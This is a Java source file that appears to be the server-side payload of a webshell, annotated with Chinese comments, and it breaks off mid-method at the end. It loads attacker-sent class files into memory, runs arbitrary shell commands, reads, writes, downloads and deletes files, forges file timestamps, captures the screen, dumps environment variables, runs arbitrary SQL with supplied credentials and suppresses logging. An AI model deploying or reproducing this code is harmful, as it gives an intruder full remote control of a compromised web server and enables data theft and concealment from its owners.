package test;

import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.PrintStream;
import java.io.RandomAccessFile;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.URL;
import java.nio.charset.Charset;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.attribute.BasicFileAttributeView;
import java.nio.file.attribute.FileTime;
import java.sql.Connection;
import java.sql.Driver;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.ResultSetMetaData;
import java.sql.Statement;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Properties;
import java.util.zip.GZIPInputStream;
import java.util.zip.GZIPOutputStream;
import javax.imageio.ImageIO;

public class payload extends ClassLoader {
    public static final char[] toBase64 = new char[]{'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '+', '/'};
    //用于变量存放，包括req、resp、执行参数。
    HashMap parameterMap = new HashMap();
    //用来存放已加载的插件类
    HashMap sessionMap;
    Object servletContext;
    Object servletRequest;
    Object httpSession;
    //本次请求带的参数，会用于还原parameterMap
    byte[] requestData;
    ByteArrayOutputStream outputStream;

    public payload() {
    }

    public payload(ClassLoader loader) {
        super(loader);
    }

    public Class g(byte[] b) {
        return super.defineClass(b, 0, b.length);
    }

    public byte[] run() {
        //插件
        String className = this.get("evalClassName");
        //调用方法
        String methodName = this.get("methodName");
        if (methodName != null) {
            ByteArrayOutputStream stream;
            PrintStream printStream;
            Class var10000;
            //没有传evalClassName,说明是执行shell自带功能
            if (className == null) {
                try {
                    Method method = this.getClass().getMethod(methodName, (Class[])null);
                    var10000 = method.getReturnType();
                    Class var10001 = null;
                    if (var10001 == null) {
                        try {
                            var10001 = Class.forName("[B");
                        } catch (ClassNotFoundException var6) {
                            throw new NoClassDefFoundError(var6.getMessage());
                        }

                    }
                    //判断是不是byte数组
                    return var10000.isAssignableFrom(var10001) ? (byte[])method.invoke(this, (Object[])null) : "this method returnType not is byte[]".getBytes();
                } catch (Exception var7) {
                    stream = new ByteArrayOutputStream();
                    printStream = new PrintStream(stream);
                    var7.printStackTrace(printStream);
                    printStream.flush();
                    printStream.close();
                    return stream.toByteArray();
                }
            } else {
                //插件执行
                try {
                    //把前面通过include加载的插件class取出来
                    Class evalClass = (Class)this.sessionMap.get(className);
                    if (evalClass == null && this.httpSession != null) {
                        evalClass = (Class)this.sessionMap.get(className);
                    }

                    if (evalClass != null) {
                        //初始化插件
                        Object object = evalClass.newInstance();
                        //调用插件的equals和toString方法
                        object.equals(this.parameterMap);
                        object.toString();
                        Object resultObject = this.parameterMap.get("result");
                        if (resultObject != null) {
                            var10000 = null;
                            if (var10000 == null) {
                                try {
                                    var10000 = Class.forName("[B");
                                } catch (ClassNotFoundException var8) {
                                    throw new NoClassDefFoundError(var8.getMessage());
                                }

                            }

                            return var10000.isAssignableFrom(resultObject.getClass()) ? (byte[])resultObject : "return typeErr".getBytes();
                        } else {
                            return new byte[0];
                        }
                    } else {
                        return "evalClass is null".getBytes();
                    }
                } catch (Exception var9) {
                    stream = new ByteArrayOutputStream();
                    printStream = new PrintStream(stream);
                    var9.printStackTrace(printStream);
                    printStream.flush();
                    printStream.close();
                    return stream.toByteArray();
                }
            }
        } else {
            return "method is null".getBytes();
        }
    }

    public void formatParameter() {
        //通过requestData还原出parameterMap
        byte[] parameterByte = this.requestData;
        ByteArrayInputStream tStream = new ByteArrayInputStream(parameterByte);
        ByteArrayOutputStream tp = new ByteArrayOutputStream();
        String key = null;
        byte[] lenB = new byte[4];
        Object var6 = null;

        try {
            GZIPInputStream inputStream = new GZIPInputStream(tStream);

            while(true) {
                while(true) {
                    byte t = (byte)inputStream.read();
                    if (t == -1) {
                        tp.close();
                        tStream.close();
                        inputStream.close();
                        return;
                    }
                    //读到2,为一个参数分割
                    if (t == 2) {
                        key = new String(tp.toByteArray());
                        inputStream.read(lenB);
                        int len = bytesToInt(lenB);
                        byte[] data = new byte[len];
                        int readOneLen = 0;

                        while((readOneLen += inputStream.read(data, readOneLen, data.length - readOneLen)) < data.length) {
                        }
                        //还原参数
                        this.parameterMap.put(key, data);
                        tp.reset();
                    } else {
                        tp.write(t);
                    }
                }
            }
        } catch (Exception var11) {
        }
    }

    public boolean equals(Object obj) {
        //handlec处理req、resp
        if (obj != null && this.handle(obj)) {
            //处理参数
            this.formatParameter();
            //不打印日志
            this.noLog(this.servletContext);
            return true;
        } else {
            return false;
        }
    }

    public boolean handle(Object obj) {
        if (obj == null) {
            return false;
        } else {
            Class var10000 = null;
            if (var10000 == null) {
                try {
                    var10000 = Class.forName("java.io.ByteArrayOutputStream");
                } catch (ClassNotFoundException var7) {
                    throw new NoClassDefFoundError(var7.getMessage());
                }

            }

            if (var10000.isAssignableFrom(obj.getClass())) {
                this.outputStream = (ByteArrayOutputStream)obj;
                return false;
            } else {
                //用request代替pagecontext
                if (this.supportClass(obj, "%s.servlet.http.HttpServletRequest")) {
                    this.servletRequest = obj;
                } else if (this.supportClass(obj, "%s.servlet.ServletRequest")) {
                    this.servletRequest = obj;
                } else {
                    var10000 = null;
                    if (var10000 == null) {
                        try {
                            var10000 = Class.forName("[B");
                        } catch (ClassNotFoundException var6) {
                            throw new NoClassDefFoundError(var6.getMessage());
                        }

                    }

                    if (var10000.isAssignableFrom(obj.getClass())) {
                        this.requestData = (byte[])obj;
                        //用session代替pagecontext
                    } else if (this.supportClass(obj, "%s.servlet.http.HttpSession")) {
                        this.httpSession = obj;
                    }
                }
                //直接从pagecontext里面取出req、resp、session
                this.handlePayloadContext(obj);

                //初始化sessionMap,用来存放插件类
                if (this.getSessionAttribute("sessionMap") != null) {
                    this.sessionMap = (HashMap)this.getSessionAttribute("sessionMap");
                } else {
                    this.sessionMap = new HashMap();
                    this.setSessionAttribute("sessionMap", this.sessionMap);
                }

                if (this.servletRequest != null) {
                    Object var10001 = this.servletRequest;
                    Class[] var10003 = new Class[1];
                    Class var10006 = null;
                    if (var10006 == null) {
                        try {
                            var10006 = Class.forName("java.lang.String");
                        } catch (ClassNotFoundException var5) {
                            throw new NoClassDefFoundError(var5.getMessage());
                        }

                    }

                    var10003[0] = var10006;
                    Object retVObject = this.getMethodAndInvoke(var10001, "getAttribute", var10003, new Object[]{"parameters"});
                    if (retVObject != null) {
                        var10000 = null;
                        if (var10000 == null) {
                            try {
                                var10000 = Class.forName("[B");
                            } catch (ClassNotFoundException var4) {
                                throw new NoClassDefFoundError(var4.getMessage());
                            }

                        }

                        if (var10000.isAssignableFrom(retVObject.getClass())) {
                            //把传入的参数赋值到requestData,后续会用来还原parameterMap
                            this.requestData = (byte[])retVObject;
                        }
                    }
                }

                if (this.requestData == null) {
                    return false;
                } else {
                    this.parameterMap.put("sessionMap", this.sessionMap);
                    this.parameterMap.put("servletRequest", this.servletRequest);
                    this.parameterMap.put("servletContext", this.servletContext);
                    this.parameterMap.put("httpSession", this.httpSession);
                    return true;
                }
            }
        }
    }

    private void handlePayloadContext(Object obj) {
        try {
            Method getRequestMethod = this.getMethodByClass(obj.getClass(), "getRequest", (Class[])null);
            Method getServletContextMethod = this.getMethodByClass(obj.getClass(), "getServletContext", (Class[])null);
            Method getSessionMethod = this.getMethodByClass(obj.getClass(), "getSession", (Class[])null);
            if (getRequestMethod != null && this.servletRequest == null) {
                this.servletRequest = getRequestMethod.invoke(obj, (Object[])null);
            }

            if (getServletContextMethod != null && this.servletContext == null) {
                this.servletContext = getServletContextMethod.invoke(obj, (Object[])null);
            }

            if (getSessionMethod != null && this.httpSession == null) {
                this.httpSession = getSessionMethod.invoke(obj, (Object[])null);
            }
        } catch (Exception var5) {
        }

    }

    private boolean supportClass(Object obj, String classNameString) {
        if (obj == null) {
            return false;
        } else {
            boolean ret = false;
            Class c = null;

            try {
                if ((c = getClass(String.format(classNameString, "javax"))) != null) {
                    ret = c.isAssignableFrom(obj.getClass());
                }

                if (!ret && (c = getClass(String.format(classNameString, "jakarta"))) != null) {
                    ret = c.isAssignableFrom(obj.getClass());
                }
            } catch (Exception var6) {
            }

            return ret;
        }
    }

    //核心方法,jsp里面会调用此方法
    public String toString() {
        String returnString = this.base64Encode("Null");

        try {
            ByteArrayOutputStream temOut = this.outputStream == null ? new ByteArrayOutputStream() : this.outputStream;
            GZIPOutputStream gzipOutputStream = new GZIPOutputStream(temOut);
            if (this.parameterMap.get("evalNextData") != null) {
                //主要逻辑run()
                this.run();
                this.requestData = (byte[])this.parameterMap.get("evalNextData");
                this.parameterMap.clear();
                this.parameterMap.put("httpSession", this.httpSession);
                this.parameterMap.put("servletRequest", this.servletRequest);
                this.parameterMap.put("servletContext", this.servletContext);
                this.formatParameter();
            }
            //主要逻辑run方法
            gzipOutputStream.write(this.run());
            gzipOutputStream.close();
            returnString = this.outputStream == null ? base64Encode(temOut.toByteArray()) : "";
            temOut.close();
            //执行完，清空
            this.requestData = null;
        } catch (Exception var4) {
            returnString = this.base64Encode(var4.getMessage());
        }

        this.parameterMap.clear();
        return returnString;
    }

    public String get(String key) {
        try {
            return new String((byte[])this.parameterMap.get(key));
        } catch (Exception var3) {
            return null;
        }
    }

    public byte[] getByteArray(String key) {
        try {
            return (byte[])this.parameterMap.get(key);
        } catch (Exception var3) {
            return null;
        }
    }

    public byte[] test() {
        return "ok".getBytes();
    }

    public byte[] getFile() {
        String dirName = this.get("dirName");
        if (dirName != null) {
            dirName = dirName.trim();
            String buffer = new String();

            try {
                String currentDir = (new File(dirName)).getAbsoluteFile() + "/";
                File[] files = (new File(currentDir)).listFiles();
                buffer = buffer + "ok";
                buffer = buffer + "\n";
                buffer = buffer + currentDir;
                buffer = buffer + "\n";

                for(int i = 0; i < files.length; ++i) {
                    File file = files[i];

                    try {
                        buffer = buffer + file.getName();
                        buffer = buffer + "\t";
                        buffer = buffer + (file.isDirectory() ? "0" : "1");
                        buffer = buffer + "\t";
                        buffer = buffer + (new SimpleDateFormat("yyyy-MM-dd HH:mm:ss")).format(new Date(file.lastModified()));
                        buffer = buffer + "\t";
                        buffer = buffer + Integer.toString((int)file.length());
                        buffer = buffer + "\t";
                        StringBuffer var10000 = (new StringBuffer(String.valueOf(file.canRead() ? "R" : ""))).append(file.canWrite() ? "W" : "");
                        Class var10002 = null;
                        if (var10002 == null) {
                            try {
                                var10002 = Class.forName("java.io.File");
                            } catch (ClassNotFoundException var9) {
                                throw new NoClassDefFoundError(var9.getMessage());
                            }

                        }

                        String fileState = var10000.append(this.getMethodByClass(var10002, "canExecute", (Class[])null) != null ? (file.canExecute() ? "X" : "") : "").toString();
                        buffer = buffer + (fileState != null && fileState.trim().length() != 0 ? fileState : "F");
                        buffer = buffer + "\n";
                    } catch (Exception var10) {
                        buffer = buffer + var10.getMessage();
                        buffer = buffer + "\n";
                    }
                }
            } catch (Exception var11) {
                return String.format("dir does not exist errMsg:%s", var11.getMessage()).getBytes();
            }

            return buffer.getBytes();
        } else {
            return "No parameter dirName".getBytes();
        }
    }

    public String listFileRoot() {
        File[] files = File.listRoots();
        String buffer = new String();

        for(int i = 0; i < files.length; ++i) {
            buffer = buffer + files[i].getPath();
            buffer = buffer + ";";
        }

        return buffer;
    }

    public byte[] fileRemoteDown() {
        String url = this.get("url");
        String saveFile = this.get("saveFile");
        if (url != null && saveFile != null) {
            FileOutputStream outputStream = null;

            try {
                InputStream inputStream = (new URL(url)).openStream();
                outputStream = new FileOutputStream(saveFile);
                byte[] data = new byte[5120];
                boolean var6 = true;

                int readNum;
                while((readNum = inputStream.read(data)) != -1) {
                    outputStream.write(data, 0, readNum);
                }

                outputStream.flush();
                inputStream.close();
                return "ok".getBytes();
            } catch (Exception var8) {
                if (outputStream != null) {
                    try {
                        outputStream.close();
                    } catch (IOException var7) {
                        return var7.getMessage().getBytes();
                    }
                }

                return String.format("%s : %s", var8.getClass().getName(), var8.getMessage()).getBytes();
            }
        } else {
            return "url or saveFile is null".getBytes();
        }
    }

    public byte[] setFileAttr() {
        String type = this.get("type");
        String attr = this.get("attr");
        String fileName = this.get("fileName");
        String ret = "Null";
        if (type != null && attr != null && fileName != null) {
            try {
                File file = new File(fileName);
                Class var10001 = null;
                if ("fileBasicAttr".equals(type)) {
                    if (var10001 == null) {
                        try {
                            var10001 = Class.forName("java.io.File");
                        } catch (ClassNotFoundException var16) {
                            throw new NoClassDefFoundError(var16.getMessage());
                        }

                    }

                    if (this.getMethodByClass(var10001, "setWritable", new Class[]{Boolean.TYPE}) != null) {
                        if (attr.indexOf("R") != -1) {
                            file.setReadable(true);
                        }

                        if (attr.indexOf("W") != -1) {
                            file.setWritable(true);
                        }

                        if (attr.indexOf("X") != -1) {
                            file.setExecutable(true);
                        }

                        ret = "ok";
                    } else {
                        ret = "Java version is less than 1.6";
                    }
                } else if ("fileTimeAttr".equals(type)) {
                    if (var10001 == null) {
                        try {
                            var10001 = Class.forName("java.io.File");
                        } catch (ClassNotFoundException var15) {
                            throw new NoClassDefFoundError(var15.getMessage());
                        }

                    }

                    if (this.getMethodByClass(var10001, "setLastModified", new Class[]{Long.TYPE}) != null) {
                        Date date = new Date(0L);
                        StringBuilder builder = new StringBuilder();
                        builder.append(attr);
                        char[] cs = new char[13 - builder.length()];
                        Arrays.fill(cs, '0');
                        builder.append(cs);
                        date = new Date(date.getTime() + Long.parseLong(builder.toString()));
                        file.setLastModified(date.getTime());
                        ret = "ok";

                        try {
                            Class nioFile = Class.forName("java.nio.file.Paths");
                            Class basicFileAttributeViewClass = Class.forName("java.nio.file.attribute.BasicFileAttributeView");
                            Class filesClass = Class.forName("java.nio.file.Files");
                            if (nioFile != null && basicFileAttributeViewClass != null && filesClass != null) {
                                Path var10000 = Paths.get(fileName);
                                if (var10001 == null) {
                                    try {
                                        var10001 = Class.forName("java.nio.file.attribute.BasicFileAttributeView");
                                    } catch (ClassNotFoundException var13) {
                                        throw new NoClassDefFoundError(var13.getMessage());
                                    }

                                }

                                BasicFileAttributeView attributeView = (BasicFileAttributeView)Files.getFileAttributeView(var10000, var10001);
                                attributeView.setTimes(FileTime.fromMillis(date.getTime()), FileTime.fromMillis(date.getTime()), FileTime.fromMillis(date.getTime()));
                            }
                        } catch (Exception var14) {
                        }
                    } else {
                        ret = "Java version is less than 1.2";
                    }
                } else {
                    ret = "no ExcuteType";
                }
            } catch (Exception var17) {
                return String.format("Exception errMsg:%s", var17.getMessage()).getBytes();
            }
        } else {
            ret = "type or attr or fileName is null";
        }

        return ret.getBytes();
    }

    public byte[] readFile() {
        String fileName = this.get("fileName");
        if (fileName != null) {
            File file = new File(fileName);

            try {
                if (file.exists() && file.isFile()) {
                    byte[] data = new byte[(int)file.length()];
                    FileInputStream fileInputStream;
                    if (data.length > 0) {
                        int readOneLen = 0;
                        fileInputStream = new FileInputStream(file);

                        while((readOneLen += fileInputStream.read(data, readOneLen, data.length - readOneLen)) < data.length) {
                        }

                        fileInputStream.close();
                    } else {
                        byte[] temData = new byte[102400];
                        fileInputStream = new FileInputStream(file);
                        int readLen = fileInputStream.read(temData);
                        if (readLen > 0) {
                            data = new byte[readLen];
                            System.arraycopy(temData, 0, data, 0, data.length);
                        }

                        Object var9 = null;
                    }

                    return data;
                } else {
                    return "file does not exist".getBytes();
                }
            } catch (Exception var7) {
                return var7.getMessage().getBytes();
            }
        } else {
            return "No parameter fileName".getBytes();
        }
    }

    public byte[] uploadFile() {
        String fileName = this.get("fileName");
        byte[] fileValue = this.getByteArray("fileValue");
        if (fileName != null && fileValue != null) {
            try {
                File file = new File(fileName);
                file.createNewFile();
                FileOutputStream fileOutputStream = new FileOutputStream(file);
                fileOutputStream.write(fileValue);
                fileOutputStream.close();
                return "ok".getBytes();
            } catch (Exception var5) {
                return var5.getMessage().getBytes();
            }
        } else {
            return "No parameter fileName and fileValue".getBytes();
        }
    }

    public byte[] newFile() {
        String fileName = this.get("fileName");
        if (fileName != null) {
            File file = new File(fileName);

            try {
                return file.createNewFile() ? "ok".getBytes() : "fail".getBytes();
            } catch (Exception var4) {
                return var4.getMessage().getBytes();
            }
        } else {
            return "No parameter fileName".getBytes();
        }
    }

    public byte[] newDir() {
        String dirName = this.get("dirName");
        if (dirName != null) {
            File file = new File(dirName);

            try {
                return file.mkdirs() ? "ok".getBytes() : "fail".getBytes();
            } catch (Exception var4) {
                return var4.getMessage().getBytes();
            }
        } else {
            return "No parameter fileName".getBytes();
        }
    }

    public byte[] deleteFile() {
        String dirName = this.get("fileName");
        if (dirName != null) {
            try {
                File file = new File(dirName);
                this.deleteFiles(file);
                return "ok".getBytes();
            } catch (Exception var3) {
                return var3.getMessage().getBytes();
            }
        } else {
            return "No parameter fileName".getBytes();
        }
    }

    public byte[] moveFile() {
        String srcFileName = this.get("srcFileName");
        String destFileName = this.get("destFileName");
        if (srcFileName != null && destFileName != null) {
            File file = new File(srcFileName);

            try {
                if (file.exists()) {
                    return file.renameTo(new File(destFileName)) ? "ok".getBytes() : "fail".getBytes();
                } else {
                    return "The target does not exist".getBytes();
                }
            } catch (Exception var5) {
                return var5.getMessage().getBytes();
            }
        } else {
            return "No parameter srcFileName,destFileName".getBytes();
        }
    }

    public byte[] copyFile() {
        String srcFileName = this.get("srcFileName");
        String destFileName = this.get("destFileName");
        if (srcFileName != null && destFileName != null) {
            File srcFile = new File(srcFileName);
            File destFile = new File(destFileName);

            try {
                if (srcFile.exists() && srcFile.isFile()) {
                    FileInputStream fileInputStream = new FileInputStream(srcFile);
                    FileOutputStream fileOutputStream = new FileOutputStream(destFile);
                    byte[] data = new byte[5120];
                    boolean var8 = false;

                    int readNum;
                    while((readNum = fileInputStream.read(data)) > -1) {
                        fileOutputStream.write(data, 0, readNum);
                    }

                    fileInputStream.close();
                    fileOutputStream.close();
                    return "ok".getBytes();
                } else {
                    return "The target does not exist or is not a file".getBytes();
                }
            } catch (Exception var9) {
                return var9.getMessage().getBytes();
            }
        } else {
            return "No parameter srcFileName,destFileName".getBytes();
        }
    }

    public byte[] include() {
        byte[] binCode = this.getByteArray("binCode");
        String className = this.get("codeName");
        if (binCode != null && className != null) {
            try {
                payload payload = new payload(this.getClass().getClassLoader());
                //调用类加载器把插件加载进内存
                Class module = payload.g(binCode);
                //保存已加载类，方便后面使用
                this.sessionMap.put(className, module);
                return "ok".getBytes();
            } catch (Exception var5) {
                return this.sessionMap.get(className) != null ? "ok".getBytes() : var5.getMessage().getBytes();
            }
        } else {
            return "No parameter binCode,codeName".getBytes();
        }
    }

    public Object getSessionAttribute(String keyString) {
        if (this.httpSession != null) {
            Object var10001 = this.httpSession;
            Class[] var10003 = new Class[1];
            Class var10006 = null;
            if (var10006 == null) {
                try {
                    var10006 = Class.forName("java.lang.String");
                } catch (ClassNotFoundException var2) {
                    throw new NoClassDefFoundError(var2.getMessage());
                }

            }

            var10003[0] = var10006;
            return this.getMethodAndInvoke(var10001, "getAttribute", var10003, new Object[]{keyString});
        } else {
            return null;
        }
    }

    public void setSessionAttribute(String keyString, Object value) {
        if (this.httpSession != null) {
            Object var10001 = this.httpSession;
            Class[] var10003 = new Class[2];
            Class var10006 = null;
            if (var10006 == null) {
                try {
                    var10006 = Class.forName("java.lang.String");
                } catch (ClassNotFoundException var4) {
                    throw new NoClassDefFoundError(var4.getMessage());
                }

            }

            var10003[0] = var10006;
            if (var10006 == null) {
                try {
                    var10006 = Class.forName("java.lang.Object");
                } catch (ClassNotFoundException var3) {
                    throw new NoClassDefFoundError(var3.getMessage());
                }

            }

            var10003[1] = var10006;
            this.getMethodAndInvoke(var10001, "setAttribute", var10003, new Object[]{keyString, value});
        }

    }

    public byte[] execCommand() {
        String cmdLine = this.get("cmdLine");
        if (cmdLine != null) {
            try {
                Process process;
                if (System.getProperty("os.name").toLowerCase().indexOf("windows") >= 0) {
                    process = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", cmdLine});
                } else {
                    process = Runtime.getRuntime().exec(cmdLine);
                }

                String result = "";
                InputStream inputStream = process.getInputStream();
                InputStream errorInputStream = process.getErrorStream();
                BufferedReader br = new BufferedReader(new InputStreamReader(inputStream, Charset.forName(System.getProperty("sun.jnu.encoding"))));
                BufferedReader errorReader = new BufferedReader(new InputStreamReader(errorInputStream, Charset.forName(System.getProperty("sun.jnu.encoding"))));

                String disr;
                for(disr = br.readLine(); disr != null; disr = br.readLine()) {
                    result = String.valueOf(result) + disr + "\n";
                }

                for(disr = errorReader.readLine(); disr != null; disr = br.readLine()) {
                    result = String.valueOf(result) + disr + "\n";
                }

                return result.getBytes();
            } catch (Exception var9) {
                return var9.getMessage().getBytes();
            }
        } else {
            return "No parameter cmdLine".getBytes();
        }
    }

    public byte[] getBasicsInfo() {
        try {
            Enumeration keys = System.getProperties().keys();
            String basicsInfo = new String();
            basicsInfo = basicsInfo + "FileRoot : " + this.listFileRoot() + "\n";
            basicsInfo = basicsInfo + "CurrentDir : " + (new File("")).getAbsoluteFile() + "/" + "\n";
            basicsInfo = basicsInfo + "CurrentUser : " + System.getProperty("user.name") + "\n";
            basicsInfo = basicsInfo + "DocBase : " + this.getDocBase() + "\n";
            basicsInfo = basicsInfo + "RealFile : " + this.getRealPath() + "\n";
            basicsInfo = basicsInfo + "servletRequest : " + (this.servletRequest == null ? "null" : String.valueOf(this.servletRequest.hashCode()) + "\n");
            basicsInfo = basicsInfo + "servletContext : " + (this.servletContext == null ? "null" : String.valueOf(this.servletContext.hashCode()) + "\n");
            basicsInfo = basicsInfo + "httpSession : " + (this.httpSession == null ? "null" : String.valueOf(this.httpSession.hashCode()) + "\n");

            try {
                basicsInfo = basicsInfo + "OsInfo : " + String.format("os.name: %s os.version: %s os.arch: %s", System.getProperty("os.name"), System.getProperty("os.version"), System.getProperty("os.arch")) + "\n";
            } catch (Exception var6) {
                basicsInfo = basicsInfo + "OsInfo : " + var6.getMessage() + "\n";
            }

            basicsInfo = basicsInfo + "IPList : " + getLocalIPList() + "\n";

            while(keys.hasMoreElements()) {
                Object object = keys.nextElement();
                if (object instanceof String) {
                    String key = (String)object;
                    basicsInfo = basicsInfo + key + " : " + System.getProperty(key) + "\n";
                }
            }

            Map envMap = this.getEnv();
            String key;
            if (envMap != null) {
                for(Iterator iterator = envMap.keySet().iterator(); iterator.hasNext(); basicsInfo = basicsInfo + key + " : " + envMap.get(key) + "\n") {
                    key = (String)iterator.next();
                }
            }

            return basicsInfo.getBytes();
        } catch (Exception var7) {
            return var7.getMessage().getBytes();
        }
    }

    public byte[] screen() {
        try {
            Robot robot = new Robot();
            BufferedImage as = robot.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize().width, Toolkit.getDefaultToolkit().getScreenSize().height));
            ByteArrayOutputStream bs = new ByteArrayOutputStream();
            ImageIO.write(as, "png", ImageIO.createImageOutputStream(bs));
            byte[] data = bs.toByteArray();
            bs.close();
            return data;
        } catch (Exception var5) {
            return var5.getMessage().getBytes();
        }
    }

    public byte[] execSql() {
        String dbType = this.get("dbType");
        String dbHost = this.get("dbHost");
        String dbPort = this.get("dbPort");
        String dbUsername = this.get("dbUsername");
        String dbPassword = this.get("dbPassword");
        String execType = this.get("execType");
        String execSql = this.get("execSql");
        if (dbType != null && dbHost != null && dbPort != null && dbUsername != null && dbPassword != null && execType != null && execSql != null) {
            try {
                try {
                    Class.forName("com.microsoft.sqlserver.jdbc.SQLServerDriver");
                } catch (Exception var22) {
                }

                try {
                    Class.forName("oracle.jdbc.driver.OracleDriver");
                } catch (Exception var21) {
                    try {
                        Class.forName("oracle.jdbc.OracleDriver");
                    } catch (Exception var20) {
                    }
                }

                try {
                    Class.forName("com.mysql.cj.jdbc.Driver");
                } catch (Exception var19) {
                    try {
                        Class.forName("com.mysql.jdbc.Driver");
                    } catch (Exception var18) {
                    }
                }

                try {
                    Class.forName("org.postgresql.Driver");
                } catch (Exception var17) {
                }

                String connectUrl = null;
                if ("mysql".equals(dbType)) {
                    connectUrl = "jdbc:mysql://" + dbHost + ":" + dbPort + "/" + "?useSSL=false&serverTimezone=UTC&zeroDateTimeBehavior=convertToNull&noDatetimeStringSync=true";
                } else if ("oracle".equals(dbType)) {
                    connectUrl = "jdbc:oracle:thin:@" + dbHost + ":" + dbPort + ":orcl";
                } else if ("sqlserver".equals(dbType)) {
                    connectUrl = "jdbc:sqlserver://" + dbHost + ":" + dbPort + ";";
                } else if ("postgresql".equals(dbType)) {
                    connectUrl = "jdbc:postgresql://" + dbHost + ":" + dbPort + "/";
                }

                if (dbHost.indexOf("jdbc:") != -1) {
                    connectUrl = dbHost;
                }

                if (connectUrl != null) {
                    try {
                        Connection dbConn = null;

                        try {
                            dbConn = getConnection(connectUrl, dbUsername, dbPassword);
                        } catch (Exception var16) {
                        }

                        if (dbConn == null) {
                            dbConn = DriverManager.getConnection(connectUrl, dbUsername, dbPassword);
                        }

                        Statement statement = dbConn.createStatement();
                        if (!execType.equals("select")) {
                            int affectedNum = statement.executeUpdate(execSql);
                            statement.close();
                            dbConn.close();
                            return ("Query OK, " + affectedNum + " rows affected").getBytes();
                        } else {
                            String data = "ok\n";
                            ResultSet resultSet = statement.executeQuery(execSql);
                            ResultSetMetaData metaData = resultSet.getMetaData();
                            int columnNum = metaData.getColumnCount();

                            int i;
                            for(i = 0; i < columnNum; ++i) {
                                data = data + this.base64Encode(String.format("%s", metaData.getColumnName(i + 1))) + "\t";
                            }

                            for(data = data + "\n"; resultSet.next(); data = data + "\n") {
                                for(i = 0; i < columnNum; ++i) {
                                    data = data + this.base64Encode(String.format("%s", resultSet.getString(i + 1))) + "\t";
                                }
                            }

                            resultSet.close();
                            statement.close();
                            dbConn.close();
                            return data.getBytes();
                        }
                    } catch (Exception var23) {
                        return var23.getMessage().getBytes();
                    }
                } else {
                    return ("no " + dbType + " Dbtype").getBytes();
                }
            } catch (Exception var24) {
                return var24.getMessage().getBytes();
            }
        } else {
            return "No parameter dbType,dbHost,dbPort,dbUsername,dbPassword,execType,execSql".getBytes();
        }
    }

    public byte[] close() {
        try {
            if (this.httpSession != null) {
                this.getMethodAndInvoke(this.httpSession, "invalidate", (Class[])null, (Object[])null);
            }

            return "ok".getBytes();
        } catch (Exception var2) {
            return var2.getMessage().getBytes();
        }
    }

    public byte[] bigFileUpload() {
        String fileName = this.get("fileName");
        byte[] fileContents = this.getByteArray("fileContents");
        String position = this.get("position");

        try {
            if (position == null) {
                FileOutputStream fileOutputStream = new FileOutputStream(fileName, true);
                fileOutputStream.write(fileContents);
                fileOutputStream.flush();
                fileOutputStream.close();
            } else {
                RandomAccessFile fileOutputStream = new RandomAccessFile(fileName, "rw");
                fileOutputStream.seek((long)Integer.parseInt(position));
                fileOutputStream.write(fileContents);
                fileOutputStream.close();
            }

            return "ok".getBytes();
        } catch (Exception var5) {
            return String.format("Exception errMsg:%s", var5.getMessage()).getBytes();
        }
    }

    public byte[] bigFileDownload() {
        String fileName = this.get("fileName");
        String mode = this.get("mode");
        String readByteNumString = this.get("readByteNum");
        String positionString = this.get("position");

        try {
            if ("fileSize".equals(mode)) {
                File file = new File(fileName);
                return file.canRead() ? String.valueOf(file.length()).getBytes() : "not read".getBytes();
            } else if ("read".equals(mode)) {
                int position = Integer.valueOf(positionString);
                int readByteNum = Integer.valueOf(readByteNumString);
                byte[] readData = new byte[readByteNum];
                FileInputStream fileInputStream = new FileInputStream(fileName);
                fileInputStream.skip((long)position);
                int readNum = fileInputStream.read(readData);
                fileInputStream.close();
                return readNum == readData.length ? readData : copyOf(readData, readNum);
            } else {
                return "no mode".getBytes();
            }
        } catch (Exception var10) {
            return String.format("Exception errMsg:%s", var10.getMessage()).getBytes();
        }
    }

    public static byte[] copyOf(byte[] original, int newLength) {
        byte[] arrayOfByte = new byte[newLength];
        System.arraycopy(original, 0, arrayOfByte, 0, Math.min(original.length, newLength));
        return arrayOfByte;
    }

    public Map getEnv() {
        try {
            int jreVersion = Integer.parseInt(System.getProperty("java.version").substring(2, 3));
            if (jreVersion >= 5) {
                try {
                    Class var10000 = null;
                    if (var10000 == null) {
                        try {
                            var10000 = Class.forName("java.lang.System");
                        } catch (ClassNotFoundException var4) {
                            throw new NoClassDefFoundError(var4.getMessage());
                        }

                    }

                    Method method = var10000.getMethod("getenv");
                    if (method != null) {
                        var10000 = method.getReturnType();
                        Class var10001 = null;
                        if (var10001 == null) {
                            try {
                                var10001 = Class.forName("java.util.Map");
                            } catch (ClassNotFoundException var3) {
                                throw new NoClassDefFoundError(var3.getMessage());
                            }

                        }

                        if (var10000.isAssignableFrom(var10001)) {
                            return (Map)method.invoke((Object)null, (Object[])null);
                        }
                    }

                    return null;
                } catch (Exception var5) {
                    return null;
                }
            } else {
                return null;
            }
        } catch (Exception var6) {
            return null;
        }
    }

    public String getDocBase() {
        try {
            return this.getRealPath();
        } catch (Exception var2) {
            return var2.getMessage();
        }
    }

    public static Connection getConnection(String url, String userName, String password) {
        Connection connection = null;

        try {
            Class var10000 = null;
            if (var10000 == null) {
                try {
